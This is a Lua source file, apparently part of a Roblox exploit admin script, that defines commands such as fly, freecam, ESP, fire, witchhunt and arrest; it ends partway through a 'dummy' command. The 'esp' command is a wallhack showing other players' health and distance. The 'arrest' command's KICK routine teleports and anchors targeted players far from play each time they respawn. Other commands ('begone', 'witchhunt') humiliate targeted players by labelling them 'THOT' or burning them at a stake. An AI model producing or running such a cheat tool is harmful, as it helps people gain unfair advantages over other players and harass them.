addcmd('noplrsound','creates a sound inside of someone',{'noplayersound','unplayersound','unplrsound'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	if not args[1] then return end
	local pchar=_char(v)
	for _, child in pairs( pchar:GetDescendants()) do
    if child.ClassName == "Sound" then
    child:Destroy() end end
    end
end)

addcmd('fly','makes you fly',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
sFLY()
end
end)

addcmd('flyspeed','set the fly speed',{'flysp'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
if isNumber(args[1]) then
iyflyspeed = args[1]
end end end)

addcmd('unfly','takes away fly',{'nofly'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
NOFLY()
end
end)

addcmd('exit','kills roblox process',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
game:shutdown() 
end
end)

addcmd('fire', 'set a player on fire',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
        local pchar=_char(v)
        local Fire1 = Instance.new("Fire", pchar.Head)
        local Fire2 = Instance.new("Fire", pchar.HumanoidRootPart)
        local Fire3 = Instance.new("Fire", pchar["Left Arm"])
        local Fire4 = Instance.new("Fire", pchar["Right Arm"])
        local Fire5 = Instance.new("Fire", pchar["Left Leg"])
        local Fire6 = Instance.new("Fire", pchar["Right Leg"])
   		if not args[2] then return end
        Fire1.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
        Fire1.SecondaryColor = Color3.new((args[2]),(args[3]),(args[4]))
        Fire2.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
        Fire2.SecondaryColor = Color3.new((args[2]),(args[3]),(args[4]))
        Fire3.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
        Fire3.SecondaryColor = Color3.new((args[2]),(args[3]),(args[4]))
        Fire4.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
        Fire4.SecondaryColor = Color3.new((args[2]),(args[3]),(args[4]))
        Fire5.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
        Fire5.SecondaryColor = Color3.new((args[2]),(args[3]),(args[4]))
        Fire6.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
        Fire6.SecondaryColor = Color3.fromRGB((args[2]),(args[3]),(args[4]))
end)
end
end)

addcmd('discomesh', 'body parts get  f u n k y',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
local plr = _players[v]
local meshes = {"Brick","Cylinder","Head","Sphere","Torso","Wedge"}
local h = _players[v].Character.Head.Mesh
local t = Instance.new("SpecialMesh",_players[v].Character.Torso)
local la = Instance.new("SpecialMesh",_players[v].Character["Left Arm"])
local ra = Instance.new("SpecialMesh",_players[v].Character["Right Arm"])
local ll = Instance.new("SpecialMesh",_players[v].Character["Left Leg"])
local rl = Instance.new("SpecialMesh",_players[v].Character["Right Leg"])
while true do wait()
h.MeshType = meshes[math.random(1,#meshes)]
h.Offset = Vector3.new(math.random() * 2 - 1,math.random() * 2 - 1,math.random() * 2 - 1);
h.Parent.BrickColor = BrickColor.Random()
t.MeshType = meshes[math.random(1,#meshes)]
t.Offset = Vector3.new(math.random() * 2 - 1,math.random() * 2 - 1,math.random() * 2 - 1);
t.Parent.BrickColor = BrickColor.Random()
la.MeshType = meshes[math.random(1,#meshes)]
la.Offset = Vector3.new(math.random() * 2 - 1,math.random() * 2 - 1,math.random() * 2 - 1);
la.Parent.BrickColor = BrickColor.Random()
ra.MeshType = meshes[math.random(1,#meshes)]
ra.Offset = Vector3.new(math.random() * 2 - 1,math.random() * 2 - 1,math.random() * 2 - 1);
ra.Parent.BrickColor = BrickColor.Random()
ll.MeshType = meshes[math.random(1,#meshes)]
ll.Offset = Vector3.new(math.random() * 2 - 1,math.random() * 2 - 1,math.random() * 2 - 1);
ll.Parent.BrickColor = BrickColor.Random()
rl.MeshType = meshes[math.random(1,#meshes)]
rl.Offset = Vector3.new(math.random() * 2 - 1,math.random() * 2 - 1,math.random() * 2 - 1);
rl.Parent.BrickColor = BrickColor.Random()
end end) end end)

addcmd('chickenarms', 'I can fly!!1',{'chicken'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
local Chicken = _players[v].Character
Chicken.Torso["Left Shoulder"].C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,math.pi/2,0) * CFrame.fromEulerAnglesXYZ(math.pi/2, 0, 0) * CFrame.fromEulerAnglesXYZ(0,-math.pi/2,0)
Chicken.Torso["Left Shoulder"].C1 = CFrame.new(0, 0.5, 0)
Chicken.Torso["Right Shoulder"].C0 = CFrame.new(1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,-math.pi/2,0) * CFrame.fromEulerAnglesXYZ(math.pi/2, 0, 0) * CFrame.fromEulerAnglesXYZ(0,-math.pi/2,0)
Chicken.Torso["Right Shoulder"].C1 = CFrame.new(0, 0.5, 0)
end) end end)

addcmd('esp', 'view a player and a players status',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	for _, child in pairs( game["CoreGui"]:GetChildren()) do
    if child.Name == gPlayers[v].Name then
	child:Destroy()
end end wait(0.5)
local m = game["Players"].LocalPlayer:GetMouse()
local rs = game:GetService("RunService").RenderStepped
local espplr = gPlayers[v]
        if espplr.Character and espplr.Name ~= _players.LocalPlayer.Name then
    for b,n in pairs (espplr.Character:GetChildren()) do
        if (n:IsA("BasePart")) then
        local a = Instance.new("BoxHandleAdornment", game.CoreGui)
		a.Name = espplr.Name
        a.Adornee = n
        a.AlwaysOnTop = true
        a.ZIndex = 0
        a.Size = n.Size
        a.Transparency = 0.7
		local resetting = false
        if espplr.TeamColor == _players.LocalPlayer.TeamColor then
            a.Color = BrickColor.new("Lime green")
   			else
            a.Color = BrickColor.new("Really red")
            end
			if espplr.Character and espplr.Character:FindFirstChild('Head') then
			local BillboardGui = Instance.new("BillboardGui", game.CoreGui)
			local TextLabel = Instance.new("TextLabel")
			BillboardGui.Adornee = espplr.Character.Head
			BillboardGui.Name = espplr.Name
			BillboardGui.Size = UDim2.new(0, 100, 0, 150)
			BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
			BillboardGui.AlwaysOnTop = true
			TextLabel.Parent = BillboardGui
			TextLabel.BackgroundTransparency = 1
			TextLabel.Position = UDim2.new(0, 0, 0, -50)
			TextLabel.Size = UDim2.new(0, 100, 0, 100)
			TextLabel.Font = Enum.Font.SourceSansSemibold
			TextLabel.TextSize = 20
			TextLabel.TextColor3 = Color3.new(1, 1, 1)
			TextLabel.TextStrokeTransparency = 0
			TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
			espplr.Character:WaitForChild("Humanoid").Died:connect(function()
			BillboardGui:Destroy() a:Destroy() end)
			_players.PlayerRemoving:connect(function(player)
			if player.Name == espplr.Name then
			BillboardGui:Destroy() a:Destroy()
			end end)
			game:GetService("RunService").RenderStepped:Connect(function()
			if espplr.Character ~= nil and espplr.Character.Parent ~= nil and espplr.Character:FindFirstChild('HumanoidRootPart') and espplr.Character:FindFirstChild('Humanoid') and game.CoreGui:FindFirstChild(espplr.Name) then
			local pos = math.floor((_players.LocalPlayer.Character.HumanoidRootPart.Position - espplr.Character.HumanoidRootPart.Position).magnitude)
			TextLabel.Text = 'Name: '..espplr.Name..' | Health: '..espplr.Character.Humanoid.Health..' | Studs: '..pos else
			BillboardGui:Destroy() a:Destroy() end end)
			end
        end
    end
end
	end)
	end
end
end)

addcmd('noesp', 'removes esp',{'unesp'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	for _, child in pairs( game["CoreGui"]:GetChildren()) do
    if child.Name == gPlayers[v].Name then
	child:Destroy()
	end
end end) end end end)

addcmd('nofire', 'extinguish a player',{'unfire'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        for j,v1 in pairs(pchar:GetDescendants()) do
		if v1:IsA("Fire") then
		v1:Destroy()
end end end end)

addcmd('shiny', 'makes a player shine',{},
function(args, speaker)
local players = getPlayer(args[1], speaker)
for i,v in pairs(players)do
spawn(function()
local pchar=_char(v)
for i,v in pairs(pchar:GetChildren()) do
if v.ClassName == "Decal" or v.ClassName == "Texture" then
v:Destroy() end
if v.ClassName == "Part" or v.ClassName == "WedgePart" or v.ClassName == "TrussPart" or v.ClassName == "UnionOperation" or v.ClassName == "CornerWedgePart" then
v.Reflectance = 1
v.Material = "Plastic"
end
end
end)
end
end)

addcmd('light', 'givs em light',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
        local pchar=_char(v)
        for j,v1 in pairs(pchar.HumanoidRootPart:GetChildren()) do
			if v1:IsA("PointLight") then
				v1:Destroy()
			end
		end
        local light = Instance.new("PointLight", pchar.HumanoidRootPart)
		light.Range = 12
		light.Brightness = 3
		if not args[2] then return end
        light.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
		light.Range = 12
		light.Brightness = 3
		end)
    end
end)

addcmd('begone', 'BEGONE THOT',{'thot'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
		local thotbottle = game:GetService("InsertService"):LoadLocalAsset("rbxassetid://01422895508")
        	local pchar=_char(v)
		thotbottle.Name = 'THOT BEGONE'
		thotbottle.Handle:Destroy()
		execCmd('freeze '..gPlayers[v].Name)
		execCmd('name '..gPlayers[v].Name..' THOT')
		execCmd('spasm '..gPlayers[v].Name)
		thotbottle.Parent = pchar
		thotbottle:MoveTo(pchar.HumanoidRootPart.Position + Vector3.new(0, 0, 7))
		local cf = pchar.HumanoidRootPart.CFrame
		local newcf = cf + cf.lookVector * 6
		thotbottle.Head.CFrame = newcf
		local s = Instance.new("Sound")
		s.Name = "BEGONE"
		s.SoundId = "http://www.roblox.com/asset/?id=1095911222"
		s.Volume = 10
		s.Parent = thotbottle
		s:play()
		local d = Instance.new("Sound")
		d.Name = "WuOOOH"
		d.SoundId = "http://www.roblox.com/asset/?id=253143032"
		d.Volume = 5
		d.Parent = pchar
		wait(4)
		if gPlayers[v] then
		execCmd('thaw '..gPlayers[v].Name)
		execCmd('fling '..gPlayers[v].Name)
		thotbottle:Destroy()
		d:play()
		end if gPlayers[v] then
		wait(3)
		execCmd('explode '..gPlayers[v].Name)
		pchar:BreakJoints() end
		end)
    end
end)

addcmd('glowstick', 'givs em glo stik',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	System = {}
System.Create = function(a, c)
	local e = Instance.new(a)
	for d, a in pairs(c) do
		local b, a = ypcall(function()
			return e[d]
		end)
		if b then
			e[d] = c[d]
		end
	end
	return e
end
function b(d, b)
	local c = getfenv(d)
	local a = setmetatable({}, {
		__index = function(a, a)
			if a:lower() == 'script' then
				return b
			else
				return c[a]
			end
		end
	})
	setfenv(d, a)
	ypcall(function()
		d()
	end)
end
c = {}
mas = Instance.new("Model",game:GetService("Lighting")) 
mas.Name = "CompiledModel"
o1 = System.Create("Tool",{
["Name"] = "Glow Stick",
["Parent"] = mas,
["GripPos"] = Vector3.new(0, -0.300000012, 0),
["CanBeDropped"] = false,
})
o2 = System.Create("Part",{
["Name"] = "Handle",
["Parent"] = o1,
["Transparency"] = 0.10000000149012,
["Position"] = Vector3.new(-9.38995171, 2.20000148, 42.3300056),
["Rotation"] = Vector3.new(-180, 0, 0),
["CFrame"] = CFrame.new(-9.38995171, 2.20000148, 42.3300056, 1, 0, 0, 0, -1, 0, 0, 0, -1),
["FormFactor"] = Enum.FormFactor.Custom,
["Size"] = Vector3.new(0.200000033, 1.80000019, 1),
["BottomSurface"] = Enum.SurfaceType.Weld,
["TopSurface"] = Enum.SurfaceType.Weld,
["Material"] = "Neon",
})
o3 = System.Create("PointLight",{
["Parent"] = o2,
["Brightness"] = 8,
["Range"] = 14,
})
o4 = System.Create("CylinderMesh",{
["Parent"] = o2,
})
if not args[2] then
o2.Color = Color3.new(1,1,1)
o3.Color = Color3.new(1,1,1) else
o2.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
o3.Color = Color3.fromRGB((args[2]),(args[3]),(args[4])) end
mas.Parent = workspace
mas:MakeJoints()
local b = mas:GetChildren()
for a = 1, #b do
	b[a].Parent = gPlayers[v].Backpack
	ypcall(function()
		b[a]:MakeJoints()
	end)
end
mas:Destroy()
for a = 1, #c do
	coroutine.resume(c[a])
end
		end)
    end
end)

addcmd('keybind','Binds a command to a key',{},
function(args,speaker)
	if speaker.userId ~= LP.userId then
	lponly(speaker) else
    if #args < 2 then return end
    local key = string.lower(args[1])
    if #key > 1 or key == cmdbarbind then return end
    local cmdText = GLS(false,1)
    local cas = game:GetService("ContextActionService")
    cas:BindAction("Keybind"..key,function(action,state,obj)
        if state == Enum.UserInputState.Begin then
            execCmd(cmdText,speaker)
        end
    end,false,key)
    Notify("Binded "..cmdText.." to "..key)
end
end)

addcmd('unkeybind','Removes a binded command from a key',{'unbind'},
function(args,speaker)
	if speaker.userId ~= LP.userId then
	lponly(speaker) else
    if #args < 1 then return end
    local key = string.lower(args[1])
    game:GetService("ContextActionService"):UnbindAction("Keybind"..key)
    Notify("Unbinded "..key)
end
end)





addcmd('trail', 'spawns a trail behind a player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
        local pchar=_char(v)
        for j,v1 in pairs(pchar.Torso:GetChildren()) do
			if v1.Name == "TRAIL" then
				v1:Destroy()
			end
end
if args[2] then
color1 = Color3.fromRGB(args[2],args[3],args[4])
color2 = Color3.new(0,0,0) else
color1 = Color3.new(1,1,1)
color2 = Color3.new(0,0,0) end
        if pchar:FindFirstChild("Torso") then
local e = Instance.new("Trail", pchar.Torso)
e.Name = "TRAIL"
e.FaceCamera = true
e.Color = ColorSequence.new(color1,color2)
e.Attachment0 = pchar.Torso.WaistCenterAttachment
e.Attachment1 = pchar.Torso.NeckAttachment
end
		end)
    end
end)

addcmd('untrail', 'deletes the trail behind a player',{'notrail'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
        local pchar=_char(v)
        for j,v1 in pairs(pchar.Torso:GetChildren()) do
			if v1.Name == "TRAIL" then
				v1:Destroy()
			end
		end
		end)
    end
end)

local fa = false
local cam = workspace.CurrentCamera
local cam1 = 0
local cam2 = 0
local cam3 = 0
local k1 = false
local k2 = false
local k3 = false
local k4 = false
local k5 = false
local k6 = false
cs = 0.5
function movecam()
	local fc = game:GetService('Players').LocalPlayer.Character:FindFirstChild('xFC')
	if fa == false then
		repeat
			if game:GetService('Players').LocalPlayer.Character:FindFirstChild('xFC') then
				local fp = fc.Position
				fc.CFrame = CFrame.new(Vector3.new(fp.X,fp.Y+cam3,fp.Z),cam.CFrame.p)*CFrame.new(cam2,0,cam1)
				fa = true
			end
			game:GetService('RunService').RenderStepped:Wait()
		until not game:GetService('Players').LocalPlayer.Character:FindFirstChild('xFC')
		fa = false
	end
end
function kp1(inputObject, gameProcessedEvent)
	if not gameProcessedEvent and game:GetService('Players').LocalPlayer.Character and game:GetService('Players').LocalPlayer.Character:FindFirstChild('xFC') then
		if inputObject.KeyCode == Enum.KeyCode.W or inputObject.KeyCode == Enum.KeyCode.Up then
			k1 = true
			cam1 = cs end
		if inputObject.KeyCode == Enum.KeyCode.S or inputObject.KeyCode == Enum.KeyCode.Down then
			k2 = true
			cam1 = (cs*-1) end
		if inputObject.KeyCode == Enum.KeyCode.A or inputObject.KeyCode == Enum.KeyCode.Left then
			k3 = true
			cam2 = cs end
		if inputObject.KeyCode == Enum.KeyCode.D or inputObject.KeyCode == Enum.KeyCode.Right then
			k4 = true
			cam2 = (cs*-1) end
		if inputObject.KeyCode == Enum.KeyCode.E or inputObject.KeyCode == Enum.KeyCode.Space then
			k5 = true
			cam3 = cs end
		if inputObject.KeyCode == Enum.KeyCode.Q or inputObject.KeyCode == Enum.KeyCode.LeftControl then
			k6 = true
			cam3 = (cs*-1) end
	end
end
game:GetService("UserInputService").InputBegan:connect(kp1)
function kp2(inputObject, gameProcessedEvent)
	if not gameProcessedEvent and game:GetService('Players').LocalPlayer.Character and game:GetService('Players').LocalPlayer.Character:FindFirstChild('xFC') then
		if inputObject.KeyCode == Enum.KeyCode.W or inputObject.KeyCode == Enum.KeyCode.Up then
			k1 = false
			if k2 == false then
				cam1 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.S or inputObject.KeyCode == Enum.KeyCode.Down then
			k2 = false
			if k1 == false then
				cam1 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.A or inputObject.KeyCode == Enum.KeyCode.Left then
			k3= false
			if k4== false then
				cam2 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.D or inputObject.KeyCode == Enum.KeyCode.Right then
			k4 = false
			if k3 == false then
				cam2 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.E or inputObject.KeyCode == Enum.KeyCode.Space then
			k5 = false
			if k6 == false then
				cam3 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.Q or inputObject.KeyCode == Enum.KeyCode.LeftControl then
			k6 = false
			if k5 == false then
				cam3 = 0
			end
		end
	end
end
game:GetService("UserInputService").InputEnded:connect(kp2)
function FC()
	if not game:GetService('Players').LocalPlayer.Character:FindFirstChild('xFC') then
		game:GetService('Players').LocalPlayer.PlayerScripts.ControlScript.Disabled = true
		local fc = Instance.new('Part',game:GetService('Players').LocalPlayer.Character)
		fc.CanCollide = false
		fc.Anchored = true
		fc.Transparency = 1
		fc.Size = Vector3.new(1,1,1)
		fc.Name = 'xFC'
		fc.CFrame = game:GetService('Players').LocalPlayer.Character.Head.CFrame
		local cam = workspace.CurrentCamera
		cam.CameraSubject = fc
		cam.CameraType = 'Custom'
		movecam()
	end end
function UFC()
	game:GetService('Players').LocalPlayer.PlayerScripts.ControlScript.Disabled = false
	if game:GetService('Players').LocalPlayer.Character:FindFirstChild('xFC') then
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('xFC'):Destroy()
		local cam = workspace.CurrentCamera
		cam.CameraSubject = game:GetService('Players').LocalPlayer.Character.Humanoid
		cam.CameraType = 'Custom'
	end end

addcmd('freecam','freecam',{'fc'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
FC()
end
end)

addcmd('fixcam','fixes camera',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
workspace.CurrentCamera:remove()
wait(.1)
workspace.CurrentCamera.CameraSubject = LP.Character.Humanoid
workspace.CurrentCamera.CameraType = "Custom"
LP.CameraMinZoomDistance = 0.5
LP.CameraMaxZoomDistance = 400
LP.CameraMode = "Classic"
end
end)

addcmd('witchhunt', 'deletes the trail behind a player',{'burn','witch'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		local pchar=_char(v)
				local char = pchar
				local hum = char.Humanoid
				for k,c in pairs(char:children()) do if c:IsA("Part") and c.Name~="HumanoidRootPart" then c.Anchored=true end end
				hum.HealthDisplayDistance = 0
				--execcmd god
				local stake = Instance.new("Part",char)
				stake.Anchored = true
				stake.BrickColor = BrickColor.new("Reddish brown")
				stake.Material = "Wood"
				stake.Size = Vector3.new(1,7,1)
				stake.CFrame = char.Torso.CFrame*CFrame.new(0,0,1)
				local hay = Instance.new("Part",char)
				hay.Anchored = true
				hay.Material = "Grass"
				hay.BrickColor = BrickColor.new("New Yeller")
				hay.Size = Vector3.new(6,1,5)
				hay.CFrame = char.Torso.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(0,2,0)
				local hay2 = hay:clone()
				hay2.Parent = char
				hay2.CFrame = char.Torso.CFrame*CFrame.new(0,-2.6,0)*CFrame.Angles(0,6,0)
				local fire = Instance.new("Fire",hay)
				fire.Enabled = false
				fire.Heat = 25
				fire.Size = 2
				fire.Color = Color3.new(170/255,85/255,0)
				local smoke = Instance.new("Smoke",hay)
				smoke.Enabled = false
				smoke.Opacity = 1
				smoke.RiseVelocity = 25
				smoke.Size = 15
				smoke.Color = Color3.new(0,0,0)
				local light = Instance.new("PointLight",hay)
				light.Color = Color3.new(170/255,85/255,0)
				light.Range = 0
				light.Brightness = 1
				light.Enabled = false
				--[[]]
				local crack = Instance.new("Sound",hay)
				crack.SoundId = "rbxassetid://239443642"
				crack.Looped = true
				crack.Volume = 0
				local scream = Instance.new("Sound",char.Torso)
				scream.SoundId = "rbxassetid://264227115"
				scream.Looped = true
				scream.Volume = 0
				--]]
				wait()
				char['Left Arm'].CFrame = char.Torso.CFrame * CFrame.new(-0.8,0,0.7) * CFrame.Angles(-1,0,0.5)
				char['Right Arm'].CFrame = char.Torso.CFrame * CFrame.new(0.8,0,0.7) * CFrame.Angles(-1,0,-0.5)
				
				local bods = char['Body Colors']
				local colors = {
					--"Really red";
					"Bright red";
					"Crimson";
					"Maroon";
					"Really black";
				}
				
				fire.Enabled=true
				smoke.Enabled=true
				light.Enabled=true
				crack:Play()
				scream:Play()
				scream.Pitch = 0.8
				--scream.Volume = 0.5
				for i=1,30 do
					crack.Volume = crack.Volume+(1/30)
					scream.Volume = crack.Volume
					fire.Size=i
					smoke.RiseVelocity=i-5
					smoke.Size=i/2
					light.Range=i*2
					wait(1)
				end
				
				for i=1,#colors do
					bods.HeadColor=BrickColor.new(colors[i])
					bods.LeftArmColor=BrickColor.new(colors[i])
					bods.LeftLegColor=BrickColor.new(colors[i])
					bods.RightArmColor=BrickColor.new(colors[i])
					bods.RightLegColor=BrickColor.new(colors[i])
					bods.TorsoColor=BrickColor.new(colors[i])
					hay.BrickColor=BrickColor.new(colors[i])
					hay2.BrickColor=BrickColor.new(colors[i])
					stake.BrickColor=BrickColor.new(colors[i])
					wait(5)
				end
				wait(10)
				scream.Volume = 0.5
				wait(1)
				scream:Stop()
				char:BreakJoints()
			end
		end)

addcmd('unfreecam','unfreecam',{'nofreecam','unfc','nofc'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
UFC()
end
end)

addcmd('freecamspeed','unfreecam',{'fcspeed'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
if isNumber(args[1]) then
cs = args[1]
end end end)

addcmd('nolight', 'no more light',{'unlight'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        for j,v1 in pairs(pchar.HumanoidRootPart:GetChildren()) do
			if v1:IsA("PointLight") then
				v1:Destroy()
			end
		end
    end
end)

addcmd('ball', 'makes a hamster ball for a player',{'hamsterball'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
		  scale = 10
 
function weld(tab)
        local last = nil
        for i,v in pairs(tab) do
                if v:IsA("BasePart") then
                        if last then
                                local w = Instance.new("Weld",last)
                                w.Part0 = w.Parent
                                w.Part1 = v
                                local pos = last.CFrame:toObjectSpace(v.CFrame)
                                w.C0 = pos
                        end
                        last = v
                end
        end
end        
 
function makeball(pos)
local model = Instance.new("Model",workspace)
model.Name = gPlayers[v].Name .. "ball"
local rand = BrickColor.Random()
pchar.Head.Anchored = true
for i=0,340,20 do
        wait()
        for z=-90,70,20 do
                local p = Instance.new("Part",model)
                p.formFactor = "Custom"
                p.BrickColor = rand
                p.Transparency = 0.5
                p.Size = Vector3.new(scale/5.5,scale/5.5,scale/140)
                p.Anchored = true
                p.TopSurface = 0
                p.BottomSurface = 0
                p.CFrame = CFrame.new(pos) * CFrame.Angles(math.rad(z),math.rad(i),0) * CFrame.new(0,0,-scale/2)
                p:breakJoints()
        end
end
weld(model:children())
for i,v in pairs(model:children()) do v.Anchored = false end 
pchar.Head.Anchored = false
model:MakeJoints()
end
 
        if pchar then
                makeball(pchar.HumanoidRootPart.Position+Vector3.new(0,scale/2-2.5,0))
        end
    end
end)

addcmd('unball', 'makes a hamster ball for a player',{'unhamsterball','noball','nohamsterball'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
    local pchar=_char(v)
	for _, child in pairs( workspace:GetChildren()) do
    if child.Name == gPlayers[v].Name .. "ball" then
        child:Destroy()
    end
end
end
end)

local fastwait = function(time)
	local expire = tick()+(time or 0.02999999999999999889)
	while game:GetService("RunService").Heartbeat:wait() do
		if tick() >= expire then return true end
	end
end

function arrest(name)
	spawn(function()
	local p = game:GetService("Players"):FindFirstChild(name)
	local char = p.Character 
						local torso = p.Character:FindFirstChild("HumanoidRootPart") 
						local humanoid = p.Character:FindFirstChild("Humanoid")
						if torso and humanoid and not char:FindFirstChild("ADONIS_VAN") then 
							local van = game:GetService("InsertService"):LoadLocalAsset("rbxassetid://01308109587")
							if van then
								local function check()
									if not van or not van.Parent or not p or p.Parent ~= game:GetService("Players") or not torso or not humanoid or not torso.Parent or not humanoid.Parent or not char or not char.Parent then
										return false
									else
										return true
									end
								end
								
								--local driver = van.Driver 
								--local grabber = van.Clown 
								local primary = van.Primary
								--local door = van.Door
								local tPos = torso.CFrame
								
								local sound = Instance.new("Sound",primary)
								sound.SoundId = "rbxassetid://258529216"
								sound.Looped = true
								sound:Play()
								
								local chuckle = Instance.new("Sound",primary)
								chuckle.SoundId = "rbxassetid://175964948"
								chuckle.Looped = true
								chuckle.Volume = 0.5
								chuckle:Play()
								
								van.PrimaryPart = van.Primary
								van.Name = "ADONIS_VAN"
								van.Parent = workspace
								humanoid.Name = "NoResetForYou"
								humanoid.WalkSpeed = 0
								sound.Pitch = 1.3
								
								local music = workspace:FindFirstChild("COPSONG") or Instance.new("Sound",workspace)
								music.Name = "COPSONG"
								music.SoundId = "rbxassetid://132007810"
								music.Volume = 1
								music.Looped = true
								if not music.Playing then music:Play() end
								
								spawn(function()
									while fastwait(0.2) do
										van.Body.Lightbar.Red.PointLight.Enabled = true
										van.Body.Lightbar.Blue.PointLight.Enabled = false
										fastwait(0.2)
										van.Body.Lightbar.Red.PointLight.Enabled = false
										van.Body.Lightbar.Blue.PointLight.Enabled = true
									end
								end)
								
								for i = 1,200 do
									if not check() then
										break
									else
										van:SetPrimaryPartCFrame(tPos*(CFrame.new(-200+i,-1,-7)*CFrame.Angles(0,math.rad(270),0)))
										fastwait(0.001*(i/5))
									end
								end
								
								sound.Pitch = 0.9
								
								fastwait(0.5)
								if check() then
									--door.Transparency = 1
								end
								
								local freeze = Instance.new("Sound",primary)
								freeze.SoundId = "rbxassetid://163732279"
								freeze.Volume = 5
								freeze:Play()
								
								fastwait(3)
								
								if check() then
									torso.CFrame = primary.CFrame*(CFrame.new(0,2.3,0)*CFrame.Angles(0,math.rad(90),0))
								end
								
								fastwait(0.5)
								if check() then
									--door.Transparency = 0
								end
								fastwait(0.5)
								
								sound.Pitch = 1.3
								local gui = Instance.new("ScreenGui")
								local frame = Instance.new("Frame",gui)
								frame.BackgroundTransparency = 1
								frame.BackgroundColor3 = Color3.new(0,0,0)
								frame.Position = UDim2.new(0,0,0,-36)
								frame.Size = UDim2.new(1,0,1,36)
								spawn(function()
									for i = 1,0,-0.01 do
										frame.BackgroundTransparency = i
										fastwait(0.1)
									end
									frame.BackgroundTransparency = 0
								end)
								
								p.CameraMaxZoomDistance = 0.5
								
								torso.Anchored = true
								
								for i = 1,400 do
									if not check() then
										break
									else
										van:SetPrimaryPartCFrame(tPos*(CFrame.new(0+i,-1,-7)*CFrame.Angles(0,math.rad(270),0)))
										torso.CFrame = primary.CFrame*(CFrame.new(0,-0.4,0)*CFrame.Angles(0,math.rad(90),0))
										fastwait(0.1/(i*5))
										
										if i == 270 then
											music.Volume = 5
										end
									end
								end
								
local function KICK(P)
	spawn(function()
		if not FindTable(WL, P.Name) then
		for i = 1,5 do
			if P.Character and P.Character:FindFirstChild('HumanoidRootPart') then
				P.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(999000, 1001000), 1000000, 1000000)
				local SP = Instance.new('SkateboardPlatform', P.Character) SP.Position = P.Character.HumanoidRootPart.Position SP.Transparency = 1
				spawn(function()
					repeat fastwait()
						if P.Character and P.Character:FindFirstChild('HumanoidRootPart') then SP.Position = P.Character.HumanoidRootPart.Position end
					until not game:GetService("Players"):FindFirstChild(P.Name)
				end)
				P.Character.HumanoidRootPart.Anchored = true
			end
		end
		end
	end)
end
								
								if p and p.Parent == game:GetService("Players") then
									if p == game:GetService("Players").LocalPlayer then
										fastwait(5)
									end
									torso.Anchored = false
									p.CharacterAdded:Connect(function()
                                    	fastwait()
                                   	 	KICK(p)
                               		end)
									KICK(p)
								end
								fastwait(0.5)
								pcall(function() van:Destroy() end)
								pcall(function() gui:Destroy() end)
								if not workspace:FindFirstChild("ADONIS_VAN") then
									music:Destroy()
								end
							end
						end
	end)
end

addcmd('arrest', 'arrests player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        arrest(gPlayers[v].Name)
    end
end)

addcmd('nodummies', 'clears dummies',{},
function(args, speaker)
for _, child in pairs( workspace:GetChildren()) do
    if child:FindFirstChild('isdummy') then
        child:Destroy()
    end
end
end)

addcmd('dummy','Make a dummy(usage: ;dummy name)',{},
function(args, speaker)
		 local name = GLS(false, 0)
	    local lchar = game:GetService('Players').LocalPlayer
		local Model0 = Instance.new("Model")
		local Part1 = Instance.new("Part")
		local SpecialMesh2 = Instance.new("SpecialMesh")
		local Decal3 = Instance.new("Decal")
